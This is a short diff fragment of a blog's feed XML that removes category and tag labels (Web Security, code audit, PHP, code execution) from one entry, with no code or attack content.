-      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
